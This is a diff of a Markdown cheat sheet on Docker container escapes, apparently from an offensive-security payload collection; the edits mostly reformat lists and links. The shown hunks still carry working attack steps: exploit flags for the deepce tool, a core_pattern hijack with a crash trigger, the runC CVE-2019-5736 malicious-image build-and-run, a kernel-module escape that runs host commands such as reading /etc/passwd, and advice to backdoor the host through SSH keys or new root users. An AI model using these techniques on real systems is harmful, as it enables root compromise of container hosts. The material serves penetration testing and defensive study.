@@ -9,32 +9,39 @@
 - [Open Docker API Port](#open-docker-api-port)
 - [Insecure Docker Registry](#insecure-docker-registry)
 - [Exploit privileged container abusing the Linux cgroup v1](#exploit-privileged-container-abusing-the-linux-cgroup-v1)
-    - [Abusing CAP_SYS_ADMIN capability](#abusing-capsysadmin-capability)
-    - [Abusing coredumps and core_pattern](#abusing-coredumps-and-corepattern)
+    - [Abusing CAP_SYS_ADMIN capability](#abusing-cap_sys_admin-capability)
+    - [Abusing coredumps and core_pattern](#abusing-coredumps-and-core_pattern)
 - [Breaking out of Docker via runC](#breaking-out-of-docker-via-runc)
 - [Breaking out of containers using a device file](#breaking-out-of-containers-using-a-device-file)
 - [References](#references)
 
 ## Tools
 
-* [kost/dockscan](https://github.com/kost/dockscan) : Dockscan is security vulnerability and audit scanner for Docker installations
+- [kost/dockscan](https://github.com/kost/dockscan) : Dockscan is security vulnerability and audit scanner for Docker installations
+
     ```powershell
     dockscan unix:///var/run/docker.sock
     dockscan -r html -o myreport -v tcp://example.com:5422
     ```
-* [stealthcopter/deepce](https://github.com/stealthcopter/deepce) : Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE)
+
+- [stealthcopter/deepce](https://github.com/stealthcopter/deepce) : Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE)
+
     ```powershell
     ./deepce.sh 
     ./deepce.sh --no-enumeration --exploit PRIVILEGED --username deepce --password deepce
     ./deepce.sh --no-enumeration --exploit SOCK --shadow
     ./deepce.sh --no-enumeration --exploit DOCKER --command "whoami>/tmp/hacked"
     ```
-* [orisano/dlayer](https://github.com/orisano/dlayer) : dlayer is docker layer analyzer.
+
+- [orisano/dlayer](https://github.com/orisano/dlayer) : dlayer is docker layer analyzer.
+
     ```powershell
     docker pull orisano/dlayer
     docker save image:tag | dlayer -i
     ```
-* [wagoodman/dive](https://github.com/wagoodman/dive) : A tool for exploring each layer in a docker image
+
+- [wagoodman/dive](https://github.com/wagoodman/dive) : A tool for exploring each layer in a docker image
+
     ```powershell
     alias dive="docker run -ti --rm  -v /var/run/docker.sock:/var/run/docker.sock wagoodman/dive"
     dive <your-image-tag>
@@ -44,7 +51,7 @@
 
 Prerequisite:
 
-* Socker mounted as volume : `- "/var/run/docker.sock:/var/run/docker.sock"`
+- Socker mounted as volume : `- "/var/run/docker.sock:/var/run/docker.sock"`
 
 Usually found in `/var/run/docker.sock`, for example for Portainer.
 
@@ -79,12 +86,11 @@ You are now on the underlying host
 uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
 ```
 
-
 ## Open Docker API Port
 
 Prerequisite:
 
-* Docker runned with `-H tcp://0.0.0.0:XXXX`
+- Docker runned with `-H tcp://0.0.0.0:XXXX`
 
 ```powershell
 $ nmap -sCV 10.10.10.10 -p 2376
@@ -108,7 +114,6 @@ $ curl –insecure -X POST -H "Content-Type: application/json" https://tls-opend
 ```
 
 From there you can backdoor the filesystem by adding an ssh key in `/root/.ssh` or adding a new root user in `/etc/passwd`.
-
 
 ## Insecure Docker Registry
 
@@ -147,11 +152,10 @@ docker login -e <email> -u oauth2accesstoken -p "<access token>" https://gcr.io
 
 ## Exploit privileged container abusing the Linux cgroup v1
 
-Prerequisite (at least one): 
+Prerequisite (at least one):
 
-* `--privileged`
-* `--security-opt apparmor=unconfined --cap-add=SYS_ADMIN` flags.
-
+- `--privileged`
+- `--security-opt apparmor=unconfined --cap-add=SYS_ADMIN` flags.
 
 ### Abusing CAP_SYS_ADMIN capability
 
@@ -182,16 +186,21 @@ sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 ### Abusing coredumps and core_pattern
 
 1. Find the mounting point using `mount`
+
     ```ps1
     $ mount | head -n 1
     overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/YLH6C6EQMMG7DA2AL5DUANDHYJ:/var/lib/docker/overlay2/l/HP7XLDFT4ERSCYVHJ2WMZBG2YT,upperdir=/var/lib/docker/overlay2/c51a87501842b287018d22e9d09d7d8dc4ede83a867f36ca199434d5ea5ac8f5/diff,workdir=/var/lib/docker/overlay2/c51a87501842b287018d22e9d09d7d8dc4ede83a867f36ca199434d5ea5ac8f5/work)
     ```
+
 2. Create an evil binary at the root of the filesystem: `cp /tmp/poc /poc`
 3. Set the program to be executed on the coredumps
+
     ```ps1
     echo "|/var/lib/docker/overlay2/c51a87501842b287018d22e9d09d7d8dc4ede83a867f36ca199434d5ea5ac8f5/diff/poc" > /proc/sys/kernel/core_pattern
     ```
+
 4. Generate a coredump with a faulty program: `gcc -o crash crash.c && ./crash`
+
     ```cpp
     int main(void) {
         char buf[1];
@@ -201,18 +210,18 @@ sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
         return 0;
     }
     ```
-5. Your payload should have been executed on the host
 
+5. Your payload should have been executed on the host
 
 ## Breaking out of Docker via runC
 
 > The vulnerability allows a malicious container to (with minimal user interaction) overwrite the host runc binary and thus gain root-level code execution on the host. The level of user interaction is being able to run any command ... as root within a container in either of these contexts: Creating a new container using an attacker-controlled image. Attaching (docker exec) into an existing container which the attacker had previous write access to.  - Vulnerability overview by the runC team
 
-Exploit for CVE-2019-5736 : https://github.com/twistlock/RunC-CVE-2019-5736
+Exploit for CVE-2019-5736 : [twistlock/RunC-CVE-2019-5736](https://github.com/twistlock/RunC-CVE-2019-5736)
 
 ```powershell
-$ docker build -t cve-2019-5736:malicious_image_POC ./RunC-CVE-2019-5736/malicious_image_POC
-$ docker run --rm cve-2019-5736:malicious_image_POC
+docker build -t cve-2019-5736:malicious_image_POC ./RunC-CVE-2019-5736/malicious_image_POC
+docker run --rm cve-2019-5736:malicious_image_POC
 ```
 
 ## Breaking out of containers using a device file
@@ -225,30 +234,29 @@ Outside container: ls -la /etc/shadow
 Output: -rwsrwsrwx 1 root shadow 1209 Oct 10  2019 /etc/shadow
 ```
 
-
 ## Breaking out of Docker via kernel modules loading
 
 > When privileged Linux containers attempt to load kernel modules, the modules are loaded into the host's kernel (because there is only *one* kernel, unlike VMs). This provides a route to an easy container escape.
 
 Exploitation:
-* Clone the repository : `git clone https://github.com/xcellerator/linux_kernel_hacking/tree/master/3_RootkitTechniques/3.8_privileged_container_escaping`
-* Build with `make`
-* Start a privileged docker container with `docker run -it --privileged --hostname docker --mount "type=bind,src=$PWD,dst=/root" ubuntu`
-* `cd /root` in the new container
-* Insert the kernel module with `./escape`
-* Run `./execute`!
+
+- Clone the repository : `git clone https://github.com/xcellerator/linux_kernel_hacking/tree/master/3_RootkitTechniques/3.8_privileged_container_escaping`
+- Build with `make`
+- Start a privileged docker container with `docker run -it --privileged --hostname docker --mount "type=bind,src=$PWD,dst=/root" ubuntu`
+- `cd /root` in the new container
+- Insert the kernel module with `./escape`
+- Run `./execute`!
 
 Unlike other techniques, this module doesn't contain any syscalls hooks, but merely creates two new proc files; `/proc/escape` and `/proc/output`.
 
-* `/proc/escape` only answers to write requests and simply executes anything that's passed to it via [`call_usermodehelper()`](https://www.kernel.org/doc/htmldocs/kernel-api/API-call-usermodehelper.html).
-* `/proc/output` just takes input and stores it in a buffer when written to, then returns that buffer when it's read from - essentially acting a like a file that both the container and the host can read/write to.
+- `/proc/escape` only answers to write requests and simply executes anything that's passed to it via [`call_usermodehelper()`](https://www.kernel.org/doc/htmldocs/kernel-api/API-call-usermodehelper.html).
+- `/proc/output` just takes input and stores it in a buffer when written to, then returns that buffer when it's read from - essentially acting a like a file that both the container and the host can read/write to.
 
 The clever part is that anything we write to `/proc/escape` gets sandwiched into `/bin/sh -c <INPUT> > /proc/output`. This means that the command is run under `/bin/sh` and the output is redirected to `/proc/output`, which we can then read from within the container.
 
 Once the module is loaded, you can simply `echo "cat /etc/passwd" > /proc/escape` and then get the result via `cat /proc/output`. Alternatively, you can use the `execute` program to give yourself a makeshift shell (albeit an extraordinarily basic one).
 
 The only caveat is that we cannot be sure that the container has `kmod` installed (which provides `insmod` and `rmmod`). To overcome this, after building the kernel module, we load it's byte array into a C program, which then uses the `init_module()` syscall to load the module into the kernel without needing `insmod`. If you're interested, take a look at the Makefile.
-
 
 ## References
 
@@ -260,4 +268,4 @@ The only caveat is that we cannot be sure that the container has `kmod` installe
 - [OWASP - Docker Security CheatSheet](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Docker_Security_Cheat_Sheet.md)
 - [Anatomy of a hack: Docker Registry - NotSoSecure - April 6, 2017](https://www.notsosecure.com/anatomy-of-a-hack-docker-registry/)
 - [Linux Kernel Hacking 3.8: Privileged Container Escapes - Harvey Phillips @xcellerator](https://github.com/xcellerator/linux_kernel_hacking/tree/master/3_RootkitTechniques/3.8_privileged_container_escaping)
-* [Escaping privileged containers for fun - 2022-03-06 :: Jordy Zomer](https://pwning.systems/posts/escaping-containers-for-fun/)
+- [Escaping privileged containers for fun - 2022-03-06 :: Jordy Zomer](https://pwning.systems/posts/escaping-containers-for-fun/)
